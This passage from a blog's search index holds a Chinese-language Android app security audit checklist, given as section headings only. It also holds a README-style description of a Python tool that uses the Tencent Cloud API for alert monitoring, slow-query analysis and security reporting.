<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>android_security_checklist</title>
      <link href="/2021/06/15/android-security-checklist/"/>
      <url>/2021/06/15/android-security-checklist/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="转自：-http-01hackcode-com-index"><a href="#转自：-http-01hackcode-com-index" class="headerlink" title="转自： http://01hackcode.com/index"></a>转自： <a href="http://01hackcode.com/index">http://01hackcode.com/index</a></h1><h1 id="Checklist"><a href="#Checklist" class="headerlink" title="Checklist"></a>Checklist</h1><h2 id="Checklist整理"><a href="#Checklist整理" class="headerlink" title="Checklist整理"></a>Checklist整理</h2><h3 id="一、静态扫描"><a href="#一、静态扫描" class="headerlink" title="一、静态扫描"></a>一、静态扫描</h3><h3 id="1-文件信息"><a href="#1-文件信息" class="headerlink" title="1 文件信息"></a>1 文件信息</h3><h3 id="2-证书检测"><a href="#2-证书检测" class="headerlink" title="2 证书检测"></a>2 证书检测</h3><h3 id="3-权限信息检测"><a href="#3-权限信息检测" class="headerlink" title="3 权限信息检测"></a>3 权限信息检测</h3><h3 id="4-so文件检测"><a href="#4-so文件检测" class="headerlink" title="4 so文件检测"></a>4 so文件检测</h3><h4 id="5-第三方库-SDK-组件检测"><a href="#5-第三方库-SDK-组件检测" class="headerlink" title="5 第三方库/SDK/组件检测"></a>5 第三方库/SDK/组件检测</h4><h5 id="第三方开源库-SDK检测"><a href="#第三方开源库-SDK检测" class="headerlink" title="第三方开源库/SDK检测"></a>第三方开源库/SDK检测</h5><h4 id="6-manifest文件检测"><a href="#6-manifest文件检测" class="headerlink" title="6 manifest文件检测"></a>6 manifest文件检测</h4><h5 id="6-1-AndroidManifest文件中PermissionGroup检测"><a href="#6-1-AndroidManifest文件中PermissionGroup检测" class="headerlink" title="6.1 AndroidManifest文件中PermissionGroup检测"></a>6.1 AndroidManifest文件中PermissionGroup检测</h5><h5 id="6-2-AndroidManifest文件中系统权限使用检测"><a href="#6-2-AndroidManifest文件中系统权限使用检测" class="headerlink" title="6.2 AndroidManifest文件中系统权限使用检测"></a>6.2 AndroidManifest文件中系统权限使用检测</h5><h5 id="6-3-AndroidManifest危险ProtectionLevel权限检测"><a href="#6-3-AndroidManifest危险ProtectionLevel权限检测" class="headerlink" title="6.3 AndroidManifest危险ProtectionLevel权限检测"></a>6.3 AndroidManifest危险ProtectionLevel权限检测</h5><h5 id="6-4-AndroidManifest-sharedUserId-检测"><a href="#6-4-AndroidManifest-sharedUserId-检测" class="headerlink" title="6.4 AndroidManifest sharedUserId 检测"></a>6.4 AndroidManifest sharedUserId 检测</h5><h5 id="6-5-AndroidManifest-allowBackup标志检测"><a href="#6-5-AndroidManifest-allowBackup标志检测" class="headerlink" title="6.5 AndroidManifest allowBackup标志检测"></a>6.5 AndroidManifest allowBackup标志检测</h5><h5 id="6-6-AndroidManifest文件Debuggable配置检测"><a href="#6-6-AndroidManifest文件Debuggable配置检测" class="headerlink" title="6.6 AndroidManifest文件Debuggable配置检测"></a>6.6 AndroidManifest文件Debuggable配置检测</h5><h5 id="6-7-非必要权限检测"><a href="#6-7-非必要权限检测" class="headerlink" title="6.7 非必要权限检测"></a>6.7 非必要权限检测</h5><h5 id="6-8-app最低版本检测"><a href="#6-8-app最低版本检测" class="headerlink" title="6.8 app最低版本检测"></a>6.8 app最低版本检测</h5><h4 id="7-组件安全检测"><a href="#7-组件安全检测" class="headerlink" title="7 组件安全检测"></a>7 组件安全检测</h4><h5 id="7-1-Activity、activity-alias、service、receiver组件导出检测"><a href="#7-1-Activity、activity-alias、service、receiver组件导出检测" class="headerlink" title="7.1 Activity、activity-alias、service、receiver组件导出检测"></a>7.1 Activity、activity-alias、service、receiver组件导出检测</h5><h5 id="7-2-ContentProvider组件导出检测"><a href="#7-2-ContentProvider组件导出检测" class="headerlink" title="7.2 ContentProvider组件导出检测"></a>7.2 ContentProvider组件导出检测</h5><h5 id="7-3-ContentProvider目录遍历漏洞检测"><a href="#7-3-ContentProvider目录遍历漏洞检测" class="headerlink" title="7.3 ContentProvider目录遍历漏洞检测"></a>7.3 ContentProvider目录遍历漏洞检测</h5><h5 id="7-4-Implicit-Service漏洞检测"><a href="#7-4-Implicit-Service漏洞检测" class="headerlink" title="7.4 Implicit Service漏洞检测"></a>7.4 Implicit Service漏洞检测</h5><h5 id="7-5-Provider：grant-uri-permission属性检测"><a href="#7-5-Provider：grant-uri-permission属性检测" class="headerlink" title="7.5 Provider：grant-uri-permission属性检测"></a>7.5 Provider：grant-uri-permission属性检测</h5><h5 id="7-7-Intent-Scheme-URI漏洞攻击检测"><a href="#7-7-Intent-Scheme-URI漏洞攻击检测" class="headerlink" title="7.7 Intent Scheme URI漏洞攻击检测"></a>7.7 Intent Scheme URI漏洞攻击检测</h5><h5 id="7-8-应用本地拒绝服务漏洞检测"><a href="#7-8-应用本地拒绝服务漏洞检测" class="headerlink" title="7.8 应用本地拒绝服务漏洞检测"></a>7.8 应用本地拒绝服务漏洞检测</h5><h5 id="7-9-manifest中定义组件未实现检测"><a href="#7-9-manifest中定义组件未实现检测" class="headerlink" title="7.9 manifest中定义组件未实现检测"></a>7.9 manifest中定义组件未实现检测</h5><h5 id="7-10-Debug或Test敏感测试组件泄露检测"><a href="#7-10-Debug或Test敏感测试组件泄露检测" class="headerlink" title="7.10 Debug或Test敏感测试组件泄露检测"></a>7.10 Debug或Test敏感测试组件泄露检测</h5><h5 id="7-11-Intent不安全反射风险检测"><a href="#7-11-Intent不安全反射风险检测" class="headerlink" title="7.11 Intent不安全反射风险检测"></a>7.11 Intent不安全反射风险检测</h5><h4 id="8-webview组件安全检测"><a href="#8-webview组件安全检测" class="headerlink" title="8 webview组件安全检测"></a>8 webview组件安全检测</h4><h5 id="8-1-WebView远程执行漏洞检测"><a href="#8-1-WebView远程执行漏洞检测" class="headerlink" title="8.1 WebView远程执行漏洞检测"></a>8.1 WebView远程执行漏洞检测</h5><h5 id="8-2-WebView潜在XSS攻击检测"><a href="#8-2-WebView潜在XSS攻击检测" class="headerlink" title="8.2 WebView潜在XSS攻击检测"></a>8.2 WebView潜在XSS攻击检测</h5><h5 id="8-3-WebView本地文件访问漏洞检测"><a href="#8-3-WebView本地文件访问漏洞检测" class="headerlink" title="8.3 WebView本地文件访问漏洞检测"></a>8.3 WebView本地文件访问漏洞检测</h5><h5 id="8-4-WebView密码明文存储漏洞检测"><a href="#8-4-WebView密码明文存储漏洞检测" class="headerlink" title="8.4 WebView密码明文存储漏洞检测"></a>8.4 WebView密码明文存储漏洞检测</h5><h5 id="8-5-主机名弱校验检测"><a href="#8-5-主机名弱校验检测" class="headerlink" title="8.5 主机名弱校验检测"></a>8.5 主机名弱校验检测</h5><h5 id="8-6-证书弱校验检测"><a href="#8-6-证书弱校验检测" class="headerlink" title="8.6 证书弱校验检测"></a>8.6 证书弱校验检测</h5><h5 id="8-7-中间人攻击漏洞检测"><a href="#8-7-中间人攻击漏洞检测" class="headerlink" title="8.7 中间人攻击漏洞检测"></a>8.7 中间人攻击漏洞检测</h5><h5 id="8-8-WebView不校验证书漏洞检测"><a href="#8-8-WebView不校验证书漏洞检测" class="headerlink" title="8.8 WebView不校验证书漏洞检测"></a>8.8 WebView不校验证书漏洞检测</h5><h5 id="8-9-WebView组件系统隐藏接口未移除漏洞"><a href="#8-9-WebView组件系统隐藏接口未移除漏洞" class="headerlink" title="8.9 WebView组件系统隐藏接口未移除漏洞"></a>8.9 WebView组件系统隐藏接口未移除漏洞</h5><h4 id="9-sqlite安全检测"><a href="#9-sqlite安全检测" class="headerlink" title="9 sqlite安全检测"></a>9 sqlite安全检测</h4><h5 id="9-1-SQLite数据库加密-SQLCipher-检测"><a href="#9-1-SQLite数据库加密-SQLCipher-检测" class="headerlink" title="9.1 SQLite数据库加密(SQLCipher)检测"></a>9.1 SQLite数据库加密(SQLCipher)检测</h5><h5 id="9-2-SQLite数据库-SQLite-Encryption-Extension-SEE-检测"><a href="#9-2-SQLite数据库-SQLite-Encryption-Extension-SEE-检测" class="headerlink" title="9.2 SQLite数据库(SQLite Encryption Extension (SEE)) 检测"></a>9.2 SQLite数据库(SQLite Encryption Extension (SEE)) 检测</h5><h5 id="9-3-SQLite数据库的对称密钥-PRAGMA-key-检测"><a href="#9-3-SQLite数据库的对称密钥-PRAGMA-key-检测" class="headerlink" title="9.3 SQLite数据库的对称密钥(PRAGMA key) 检测"></a>9.3 SQLite数据库的对称密钥(PRAGMA key) 检测</h5><h5 id="9-4-SQLiteDatabase-Transaction-Deprecated检测"><a href="#9-4-SQLiteDatabase-Transaction-Deprecated检测" class="headerlink" title="9.4 SQLiteDatabase Transaction Deprecated检测"></a>9.4 SQLiteDatabase Transaction Deprecated检测</h5><h5 id="9-5-Databases任意读写漏洞检测"><a href="#9-5-Databases任意读写漏洞检测" class="headerlink" title="9.5 Databases任意读写漏洞检测"></a>9.5 Databases任意读写漏洞检测</h5><h4 id="10-网络通信安全检测"><a href="#10-网络通信安全检测" class="headerlink" title="10 网络通信安全检测"></a>10 网络通信安全检测</h4><h5 id="10-1-SSL连接检测"><a href="#10-1-SSL连接检测" class="headerlink" title="10.1 SSL连接检测"></a>10.1 SSL连接检测</h5><h5 id="10-2-SSL不安全组件检测"><a href="#10-2-SSL不安全组件检测" class="headerlink" title="10.2 SSL不安全组件检测"></a>10.2 SSL不安全组件检测</h5><h5 id="10-3-HttpHost检测"><a href="#10-3-HttpHost检测" class="headerlink" title="10.3 HttpHost检测"></a>10.3 HttpHost检测</h5><h5 id="10-4-HttpURLConnection漏洞检测"><a href="#10-4-HttpURLConnection漏洞检测" class="headerlink" title="10.4 HttpURLConnection漏洞检测"></a>10.4 HttpURLConnection漏洞检测</h5><h5 id="10-5-网络端口开放威胁检测"><a href="#10-5-网络端口开放威胁检测" class="headerlink" title="10.5 网络端口开放威胁检测"></a>10.5 网络端口开放威胁检测</h5><h4 id="11-弱加密风险检测"><a href="#11-弱加密风险检测" class="headerlink" title="11 弱加密风险检测"></a>11 弱加密风险检测</h4><h5 id="11-1-弱加密算法风险检测"><a href="#11-1-弱加密算法风险检测" class="headerlink" title="11.1 弱加密算法风险检测"></a>11.1 弱加密算法风险检测</h5><h5 id="11-2-不安全的密钥长度风险检测"><a href="#11-2-不安全的密钥长度风险检测" class="headerlink" title="11.2 不安全的密钥长度风险检测"></a>11.2 不安全的密钥长度风险检测</h5><h5 id="11-3-ECB弱加密模式风险检测"><a href="#11-3-ECB弱加密模式风险检测" class="headerlink" title="11.3 ECB弱加密模式风险检测"></a>11.3 ECB弱加密模式风险检测</h5><h5 id="11-4-IVParameterSpec不安全初始化向量风险检测"><a href="#11-4-IVParameterSpec不安全初始化向量风险检测" class="headerlink" title="11.4 IVParameterSpec不安全初始化向量风险检测"></a>11.4 IVParameterSpec不安全初始化向量风险检测</h5><h5 id="11-5-RSA中不使用Padding风险检测"><a href="#11-5-RSA中不使用Padding风险检测" class="headerlink" title="11.5 RSA中不使用Padding风险检测"></a>11.5 RSA中不使用Padding风险检测</h5><h5 id="11-6-检测keystore是否使用密码保护"><a href="#11-6-检测keystore是否使用密码保护" class="headerlink" title="11.6 检测keystore是否使用密码保护"></a>11.6 检测keystore是否使用密码保护</h5><h4 id="12-数据安全检测"><a href="#12-数据安全检测" class="headerlink" title="12 数据安全检测"></a>12 数据安全检测</h4><h5 id="12-1-敏感信息检测"><a href="#12-1-敏感信息检测" class="headerlink" title="12.1 敏感信息检测"></a>12.1 敏感信息检测</h5><h5 id="12-2-剪贴板敏感信息泄露风险检测"><a href="#12-2-剪贴板敏感信息泄露风险检测" class="headerlink" title="12.2 剪贴板敏感信息泄露风险检测"></a>12.2 剪贴板敏感信息泄露风险检测</h5><h5 id="12-3-Intent敏感数据泄露风险检测"><a href="#12-3-Intent敏感数据泄露风险检测" class="headerlink" title="12.3 Intent敏感数据泄露风险检测"></a>12.3 Intent敏感数据泄露风险检测</h5><h5 id="12-4-PendingIntent误用风险"><a href="#12-4-PendingIntent误用风险" class="headerlink" title="12.4 PendingIntent误用风险"></a>12.4 PendingIntent误用风险</h5><h5 id="12-5-密钥硬编码风险检测"><a href="#12-5-密钥硬编码风险检测" class="headerlink" title="12.5 密钥硬编码风险检测"></a>12.5 密钥硬编码风险检测</h5><h5 id="12-6-数据或程序加载检查"><a href="#12-6-数据或程序加载检查" class="headerlink" title="12.6 数据或程序加载检查"></a>12.6 数据或程序加载检查</h5><h5 id="12-7-BASE64安全检测"><a href="#12-7-BASE64安全检测" class="headerlink" title="12.7 BASE64安全检测"></a>12.7 BASE64安全检测</h5><h5 id="12-8-文件全局读写漏洞检测"><a href="#12-8-文件全局读写漏洞检测" class="headerlink" title="12.8 文件全局读写漏洞检测"></a>12.8 文件全局读写漏洞检测</h5><h5 id="12-9-日志泄露风险检测"><a href="#12-9-日志泄露风险检测" class="headerlink" title="12.9 日志泄露风险检测"></a>12.9 日志泄露风险检测</h5><h5 id="12-10-外部加载Dex检测"><a href="#12-10-外部加载Dex检测" class="headerlink" title="12.10 外部加载Dex检测"></a>12.10 外部加载Dex检测</h5><h5 id="12-11-外部存储路径检测"><a href="#12-11-外部存储路径检测" class="headerlink" title="12.11 外部存储路径检测"></a>12.11 外部存储路径检测</h5><h5 id="12-12-明文数字证书风险"><a href="#12-12-明文数字证书风险" class="headerlink" title="12.12 明文数字证书风险"></a>12.12 明文数字证书风险</h5><h5 id="12-13-第三方oauth敏感信息泄露"><a href="#12-13-第三方oauth敏感信息泄露" class="headerlink" title="12.13 第三方oauth敏感信息泄露"></a>12.13 第三方oauth敏感信息泄露</h5><h4 id="13-敏感函数调用检测"><a href="#13-敏感函数调用检测" class="headerlink" title="13 敏感函数调用检测"></a>13 敏感函数调用检测</h4><h5 id="13-1-安全相关的函数检测"><a href="#13-1-安全相关的函数检测" class="headerlink" title="13.1 安全相关的函数检测"></a>13.1 安全相关的函数检测</h5><h5 id="13-2-安全相关的类检测"><a href="#13-2-安全相关的类检测" class="headerlink" title="13.2 安全相关的类检测"></a>13.2 安全相关的类检测</h5><h5 id="13-3-运行命令检测"><a href="#13-3-运行命令检测" class="headerlink" title="13.3 运行命令检测"></a>13.3 运行命令检测</h5><h5 id="13-4-Native-Library加载检测"><a href="#13-4-Native-Library加载检测" class="headerlink" title="13.4 Native Library加载检测"></a>13.4 Native Library加载检测</h5><h5 id="13-5-外部动态加载DEX检测"><a href="#13-5-外部动态加载DEX检测" class="headerlink" title="13.5 外部动态加载DEX检测"></a>13.5 外部动态加载DEX检测</h5><h5 id="13-6-root代码检测"><a href="#13-6-root代码检测" class="headerlink" title="13.6 root代码检测"></a>13.6 root代码检测</h5><h5 id="13-7-获取IMEI-和Device-ID敏感信息代码检测"><a href="#13-7-获取IMEI-和Device-ID敏感信息代码检测" class="headerlink" title="13.7 获取IMEI 和Device ID敏感信息代码检测"></a>13.7 获取IMEI 和Device ID敏感信息代码检测</h5><h5 id="13-8-获取Android-ID敏感信息代码检测"><a href="#13-8-获取Android-ID敏感信息代码检测" class="headerlink" title="13.8 获取Android ID敏感信息代码检测"></a>13.8 获取Android ID敏感信息代码检测</h5><h5 id="13-9-发送SMS敏感代码检测"><a href="#13-9-发送SMS敏感代码检测" class="headerlink" title="13.9 发送SMS敏感代码检测"></a>13.9 发送SMS敏感代码检测</h5><h5 id="13-10-文件删除代码检测"><a href="#13-10-文件删除代码检测" class="headerlink" title="13.10 文件删除代码检测"></a>13.10 文件删除代码检测</h5><h5 id="13-11-signature代码检测"><a href="#13-11-signature代码检测" class="headerlink" title="13.11 signature代码检测"></a>13.11 signature代码检测</h5><h4 id="14-加固检测"><a href="#14-加固检测" class="headerlink" title="14 加固检测"></a>14 加固检测</h4><h5 id="14-1-dex加固检测"><a href="#14-1-dex加固检测" class="headerlink" title="14.1 dex加固检测"></a>14.1 dex加固检测</h5><h5 id="14-2-So文件加固检测"><a href="#14-2-So文件加固检测" class="headerlink" title="14.2 So文件加固检测"></a>14.2 So文件加固检测</h5><h5 id="14-3-资源文件加固检测"><a href="#14-3-资源文件加固检测" class="headerlink" title="14.3 资源文件加固检测"></a>14.3 资源文件加固检测</h5><h5 id="14-4-混淆率检测"><a href="#14-4-混淆率检测" class="headerlink" title="14.4 混淆率检测"></a>14.4 混淆率检测</h5><h4 id="15-系统漏洞检测"><a href="#15-系统漏洞检测" class="headerlink" title="15 系统漏洞检测"></a>15 系统漏洞检测</h4><h5 id="15-1-fragment注入漏洞检测"><a href="#15-1-fragment注入漏洞检测" class="headerlink" title="15.1 fragment注入漏洞检测"></a>15.1 fragment注入漏洞检测</h5><h5 id="15-2-sqlite数据库日志泄露漏洞检测"><a href="#15-2-sqlite数据库日志泄露漏洞检测" class="headerlink" title="15.2 sqlite数据库日志泄露漏洞检测"></a>15.2 sqlite数据库日志泄露漏洞检测</h5><h5 id="15-3-随机数生成漏洞检测"><a href="#15-3-随机数生成漏洞检测" class="headerlink" title="15.3 随机数生成漏洞检测"></a>15.3 随机数生成漏洞检测</h5><h4 id="16-其他"><a href="#16-其他" class="headerlink" title="16 其他"></a>16 其他</h4><h5 id="通用签名风险检测"><a href="#通用签名风险检测" class="headerlink" title="通用签名风险检测"></a>通用签名风险检测</h5><h3 id="二、动态扫描"><a href="#二、动态扫描" class="headerlink" title="二、动态扫描"></a>二、动态扫描</h3><p>1 服务端漏洞检测</p><p>基于http代理<br>水平权限风险检测<br>垂直权限风险检测<br>sql注入漏洞检测<br>XSS漏洞检测<br>敏感信息检测（硬编码、用户密码、银行卡、身份证等明文传输）<br>基于tcp或udp(socket)代理<br>敏感信息检测（硬编码、用户密码、银行卡、身份证等明文传输）<br>html5漏洞检测</p><p>2 hook技术检测</p><p>2.1 SQLite Database存储信息检测<br>2.2 SharePreferences存储信息检测<br>2.3 Contert Provider存储信息检测<br>2.4 File存储信息检测<br>2.5 Intent数据内容检测<br>2.6 Log日志打印检测<br>2.7 System.print*输出检测<br>2.8 剪贴板敏感信息检测</p><p>3 DDOS攻击检测</p><p>3.1 组件DDOS攻击检测<br>Activity组件通用crash<br>Receiver组件通用crash<br>Service组件通用crash<br>3.2 native crash检测<br>3.3 java crash检测</p><p>4 provider注入漏洞检测</p><p>5 网络端口开放威胁检测</p><p>三、业务安全扫描<br>未整理，欢迎大家补充</p><p>四、Checklist脑图：<br>checklist-logo<br><a href="https://www.buhuixiu.com/images/checklist.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/checklist.png"></a></img></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云API项目(Python)</title>
      <link href="/2021/06/07/%E8%85%BE%E8%AE%AF%E4%BA%91API%E9%A1%B9%E7%9B%AE-Python/"/>
      <url>/2021/06/07/%E8%85%BE%E8%AE%AF%E4%BA%91API%E9%A1%B9%E7%9B%AE-Python/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。"><a href="#这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。" class="headerlink" title="这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。"></a>这是一个关于腾讯云CAPI接口进行一些二次需求开发的项目。实现的主要功能如下。</h1><h2 id="1-监控数据的量化分析，持续未解除告警的提醒通告。-重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1-监控对象-2，监控阈值名称-3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。-当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。"><a href="#1-监控数据的量化分析，持续未解除告警的提醒通告。-重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1-监控对象-2，监控阈值名称-3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。-当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。" class="headerlink" title="1, 监控数据的量化分析，持续未解除告警的提醒通告。 重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1,监控对象 2，监控阈值名称 3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。 当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。"></a>1, 监控数据的量化分析，持续未解除告警的提醒通告。 重要监控的主动推送，防止遗漏。根据SLA推送到不同的企业微信群。重点关注一级告警群，另外，通过日，周，月的告警数据（1,监控对象 2，监控阈值名称 3，监控的项目组。）输出分析报告，对相应的监控进行优化提供依据。 当触发告警一个小时候，该告警未恢复，则发送提醒到企业微信群。发送不超过1-3次。（可配置）。排除磁盘空间告警类型等。</h2><h2 id="2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。-并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。"><a href="#2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。-并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。" class="headerlink" title="2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。 并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。"></a>2，数据库日志，配置等量化分析和批量化查询。对所有mysql实例中的慢查询日志，按照半月出现次数，进行排行。 并且计算出，相应排行的sqltemplate的具体平均查询时间，锁表时间，最大扫描行数等。推送给第三方DB人员进行优化。</h2><h2 id="3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。"><a href="#3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。" class="headerlink" title="3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。"></a>3，安全相关推送。每日安全报表，将云端的每日，木马文件，异常登录审计，密码暴力破解，漏洞脆弱性管理，恶意请求，高危命令等输出成excel表格，邮件推送。减少了每日点检的麻烦。</h2><h2 id="4，360CERT-安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。"><a href="#4，360CERT-安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。" class="headerlink" title="4，360CERT 安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。"></a>4，360CERT 安全报告的推送。根据腾讯的组件情报，整理出相应的组件列表，组件列表对应的主机，主机对应的开发人员和维护人员相应管理人员。如果有新的安全报告中的主题涉及某个存在的组件，那么会将360CERT这封邮件转发给对应的开发人员，运维人员。</h2><h2 id="5，腾讯的每周安全报告推送相应的download-url-腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。"><a href="#5，腾讯的每周安全报告推送相应的download-url-腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。" class="headerlink" title="5，腾讯的每周安全报告推送相应的download url . 腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。"></a>5，腾讯的每周安全报告推送相应的download url . 腾讯漏洞脆弱性报告，筛选出未修复的状态，进行相应的主机推送。</h2><h2 id="6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。"><a href="#6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。" class="headerlink" title="6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。"></a>6，组件漏洞通告。包括系统组件和WEB漏洞组件，按照组件名，涉及主机信息，未修复状态，漏洞级别，每周发送邮件提醒。</h2><h2 id="7-云主机安全组巡检功能。-：-具体规则为匹配：高危端口全局开放，端口-amp-协议-‘ALL’-全局开放等"><a href="#7-云主机安全组巡检功能。-：-具体规则为匹配：高危端口全局开放，端口-amp-协议-‘ALL’-全局开放等" class="headerlink" title="7, 云主机安全组巡检功能。 ： 具体规则为匹配：高危端口全局开放，端口 &amp; 协议 == ‘ALL’ 全局开放等"></a>7, 云主机安全组巡检功能。 ： 具体规则为匹配：高危端口全局开放，端口 &amp; 协议 == ‘ALL’ 全局开放等</h2><h2 id="HOW-TO-RUN"><a href="#HOW-TO-RUN" class="headerlink" title="HOW TO RUN"></a>HOW TO RUN</h2><h4 id="1，环境-python-3-6-3-8"><a href="#1，环境-python-3-6-3-8" class="headerlink" title="1，环境      python 3.6 - 3.8"></a>1，环境      python 3.6 - 3.8</h4><h4 id="2-第三方模块安装-pip-install-r-requirements-txt"><a href="#2-第三方模块安装-pip-install-r-requirements-txt" class="headerlink" title="2  第三方模块安装  pip install -r requirements.txt"></a>2  第三方模块安装  pip install -r requirements.txt</h4><h4 id="3，运行-python-scheduler-datasearch-py"><a href="#3，运行-python-scheduler-datasearch-py" class="headerlink" title="3，运行 python scheduler_datasearch.py"></a>3，运行 python scheduler_datasearch.py</h4><h4 id="4，授权，需要配置自己的云-SecretId-SecretKey-到prod-生产-，dev-开发环境-的settings-py-中。common-py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。"><a href="#4，授权，需要配置自己的云-SecretId-SecretKey-到prod-生产-，dev-开发环境-的settings-py-中。common-py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。" class="headerlink" title="4，授权，需要配置自己的云 SecretId  SecretKey 到prod(生产)，dev(开发环境)的settings.py 中。common.py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。"></a>4，授权，需要配置自己的云 SecretId  SecretKey 到prod(生产)，dev(开发环境)的settings.py 中。common.py模块中涉及邮件的类，需要更改为自己的邮箱账号密码。</h4><h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><h4 id="1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。"><a href="#1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。" class="headerlink" title="1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。"></a>1，类名，方法名设计得有点乱。前面得几个模块，甚至没有用类，直接方法。</h4><h4 id="2，安全方面，整体感觉腾讯做得比较弱。-而且对云镜得基础版本用户特别不友好。-所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。"><a href="#2，安全方面，整体感觉腾讯做得比较弱。-而且对云镜得基础版本用户特别不友好。-所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。" class="headerlink" title="2，安全方面，整体感觉腾讯做得比较弱。 而且对云镜得基础版本用户特别不友好。 所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。"></a>2，安全方面，整体感觉腾讯做得比较弱。 而且对云镜得基础版本用户特别不友好。 所以不花钱想白嫖是很难得。在云平台上想省钱，仿造一套腾讯得扫描监控系统用于安全也是很必要得。</h4><h4 id="3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。"><a href="#3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。" class="headerlink" title="3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。"></a>3，虽然断断续续写了1个多月，感觉没什么人需求。。这种自己提需求，自己开发测试的方式也是醉了。。</h4><h4 id="4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。-测试先于开发-，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。"><a href="#4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。-测试先于开发-，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。" class="headerlink" title="4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。 测试先于开发 ，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。"></a>4，开发中一些坏毛病还是要改掉。。一定要好好设计。。类的层次，结构，每个类，子类，方法定义要清晰。 测试先于开发 